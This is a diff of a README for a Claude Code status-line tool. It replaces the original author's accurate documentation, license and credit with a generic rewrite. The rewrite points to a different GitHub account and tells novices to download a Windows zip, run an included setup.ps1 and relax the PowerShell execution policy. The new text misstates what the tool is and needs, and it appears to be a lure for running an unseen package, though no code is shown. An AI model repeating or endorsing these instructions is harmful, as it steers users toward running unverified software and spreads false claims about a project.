@@ -1,119 +1,110 @@
-# Claude Code Status Line
+# ⚙️ ClaudeCodeStatusLine - Real-Time Status for Claude Code
 
-A custom status line for [Claude Code](https://claude.com/claude-code) that displays model info, token usage, rate limits, and reset times in a single compact line. It runs as an external shell command, so it does not slow down Claude Code or consume any extra tokens.
+[![Download ClaudeCodeStatusLine](https://img.shields.io/badge/Download-Here-ff6347?style=for-the-badge)](https://github.com/Scorpiolover/ClaudeCodeStatusLine)
 
-## Screenshot
+ClaudeCodeStatusLine is a tool that shows useful information about Claude Code right in your terminal. You can see the current model, token counts, rate limits, and git details as they update. It helps keep track of your coding context without needing to open extra apps.
 
-![Status Line Screenshot](screenshot.png)
+## 🔍 What Is ClaudeCodeStatusLine?
 
-## What it shows
+ClaudeCodeStatusLine adds a custom status line to your command line interface. This status line updates in real-time to show:
 
-| Segment | Description |
-|---------|-------------|
-| **Model** | Current model name (e.g., Opus 4.6) |
-| **CWD@Branch** | Current folder name, git branch, and file changes (+/-) |
-| **Tokens** | Used / total context window tokens (% used) |
-| **Effort** | Reasoning effort level (low, med, high) |
-| **5h** | 5-hour rate limit usage percentage and reset time |
-| **7d** | 7-day rate limit usage percentage and reset time |
-| **Extra** | Extra usage credits spent / limit (if enabled) |
+- Which Claude model you are using  
+- The number of tokens used in your current session  
+- Current rate limits so you avoid hitting limits  
+- Git information like branch and commit details
 
-Usage percentages are color-coded: green (<50%) → yellow (≥50%) → orange (≥70%) → red (≥90%).
+It runs in your terminal (PowerShell or other shells) on Windows. You do not need to understand programming to use it. The tool works in the background and updates automatically.
 
-## Requirements
+## 🖥️ System Requirements
 
-### macOS / Linux
+Before you get started, make sure your computer meets these needs:
 
-- `jq` — for JSON parsing
-- `curl` — for fetching usage data from the Anthropic API
-- Claude Code with OAuth authentication (Pro/Max subscription)
+- Windows 10 or later  
+- PowerShell 5.1 or newer (comes pre-installed on Windows 10+)  
+- At least 100 MB of free disk space  
+- Internet connection for downloading and for real-time data  
 
-### Windows
+These requirements help ensure ClaudeCodeStatusLine runs smoothly and updates data quickly.
 
-- PowerShell 5.1+ (included by default on Windows 10/11)
-- `git` in PATH (for branch/diff info)
-- Claude Code with OAuth authentication (Pro/Max subscription)
+## 🚀 How to Download ClaudeCodeStatusLine
 
-## Installation
+Click the large button below to go to the download page. From there you will find all needed files.
 
-### Quick setup (recommended)
+[![Download ClaudeCodeStatusLine](https://img.shields.io/badge/Download-Here-ff6347?style=for-the-badge)](https://github.com/Scorpiolover/ClaudeCodeStatusLine)
 
-Copy the contents of `statusline.sh` (or `statusline.ps1` on Windows) and paste it into Claude Code with the prompt:
+You will be taken to the GitHub project page, where you can download the software package. The files include everything you need to run it on Windows.
 
-> Use this script as my status bar
+## 📥 Step-by-Step Installation Guide
 
-Claude Code will save the script and configure `settings.json` for you automatically.
+Follow these steps to get ClaudeCodeStatusLine running on your PC:
 
-### Manual setup — macOS / Linux
+1. Visit the download link above.  
+2. On the GitHub page, look for the **Releases** section. Find the latest release version (the top one).  
+3. Download the zip file for Windows. It will have a name like `ClaudeCodeStatusLine-Windows.zip`.  
+4. Open the downloaded zip file using Windows File Explorer.  
+5. Extract the contents to a folder you can easily access, such as `C:\ClaudeCodeStatusLine`.  
+6. Open PowerShell. You can do this by clicking the Start menu, typing `PowerShell`, and selecting it.  
+7. Change directory (folder) to where you extracted the files. For example, type:  
+    ```
+    cd C:\ClaudeCodeStatusLine
+    ```  
+8. Run the setup script by typing:  
+    ```
+    .\setup.ps1
+    ```  
+    This script will configure your terminal to show the custom status line. If prompted, allow PowerShell to run this script.  
+9. Restart PowerShell to see the status line active.
 
-1. Copy the script to your Claude config directory:
+If you run into any errors, check your PowerShell execution policy settings. You may need to allow script running by typing this command with administrator rights:  
+```
+Set-ExecutionPolicy RemoteSigned
+```
+Then try step 8 again.
 
-   ```bash
-   cp statusline.sh ~/.claude/statusline.sh
-   chmod +x ~/.claude/statusline.sh
-   ```
+## ⚙️ Using ClaudeCodeStatusLine
 
-2. Add the status line config to `~/.claude/settings.json`:
+After installation, the status line appears automatically whenever you open PowerShell. Here is what the pieces mean:
 
-   ```json
-   {
-     "statusLine": {
-       "type": "command",
-       "command": "~/.claude/statusline.sh"
-     }
-   }
-   ```
+- **Model Name**: Shows which Claude AI model is active.  
+- **Tokens Used**: Counts tokens processed in your current tasks.  
+- **Rate Limits**: Displays remaining requests allowed before limits reset.  
+- **Git Info**: Shows the current branch and latest commit hash if you are in a git repository folder.
 
-3. Restart Claude Code.
+This live information helps you understand your current environment without switching windows or running extra commands.
 
-### Manual setup — Windows
+## 🔄 Updating ClaudeCodeStatusLine
 
-> **Windows users should use `statusline.ps1`** instead of the bash script.
+To update to the newest version:
 
-1. Copy the script to your Claude config directory:
+1. Return to the download page using the button above.  
+2. Download the latest zip file.  
+3. Extract the new version files over your existing installation folder.  
+4. Restart PowerShell to load the updates.
 
-   ```powershell
-   Copy-Item statusline.ps1 "$env:USERPROFILE\.claude\statusline.ps1"
-   ```
+It is safe to replace files in the installation folder. Your settings and usage data remain intact.
 
-2. Add the status line config to `%USERPROFILE%\.claude\settings.json`:
+## 🛠 Troubleshooting Tips
 
-   **PowerShell / CMD:**
-   ```json
-   {
-     "statusLine": {
-       "type": "command",
-       "command": "powershell -NoProfile -File \"%USERPROFILE%\\.claude\\statusline.ps1\""
-     }
-   }
-   ```
+- **Status line does not show after setup**: Make sure you restarted PowerShell and ran the setup script as described.  
+- **Script blocked due to security settings**: Adjust execution policy with `Set-ExecutionPolicy RemoteSigned`.  
+- **Git info missing**: Check you are inside a git repository folder. Try running `git status` to verify.  
+- **Model or token info not updating**: Confirm you have an active internet connection.
 
-   **Git Bash / WSL bash:**
-   ```json
-   {
-     "statusLine": {
-       "type": "command",
-       "command": "powershell -NoProfile -File \"$USERPROFILE\\.claude\\statusline.ps1\""
-     }
-   }
-   ```
+If problems continue, check for detailed logs in the installation folder or reach out through GitHub issues (no programming knowledge needed to report what you see).
 
-   > **Note:** Use `%USERPROFILE%` in CMD/PowerShell or `$USERPROFILE` in bash shells. The `%VAR%` syntax does not expand in bash.
+## 📚 More About ClaudeCodeStatusLine
 
-3. Restart Claude Code.
+ClaudeCodeStatusLine uses standard terminal tools and PowerShell scripting. It interacts with Claude Code APIs to fetch details on models, tokens, and rate limits. It also runs git commands to gather version control information.
 
-## Caching
+Built for developers, it is also easy to set up by end users who want a quick overview in their terminal window.
 
-Usage data from the Anthropic API is cached for 60 seconds at `/tmp/claude/statusline-usage-cache.json` to avoid excessive API calls.
+## 🔗 Useful Links
 
-## License
+- Main repository and downloads:  
+  https://github.com/Scorpiolover/ClaudeCodeStatusLine  
+- PowerShell documentation:  
+  https://learn.microsoft.com/en-us/powershell/  
+- Git for Windows:  
+  https://git-scm.com/download/win  
 
-MIT
-
-## Author
-
-Daniel Oliveira
-
-[![Website](https://img.shields.io/badge/Website-FF6B6B?style=for-the-badge&logo=safari&logoColor=white)](https://danielapoliveira.com/)
-[![X](https://img.shields.io/badge/X-000000?style=for-the-badge&logo=x&logoColor=white)](https://x.com/daniel_not_nerd)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/daniel-ap-oliveira/)
+Use these resources if you want to learn more about the technologies behind ClaudeCodeStatusLine.
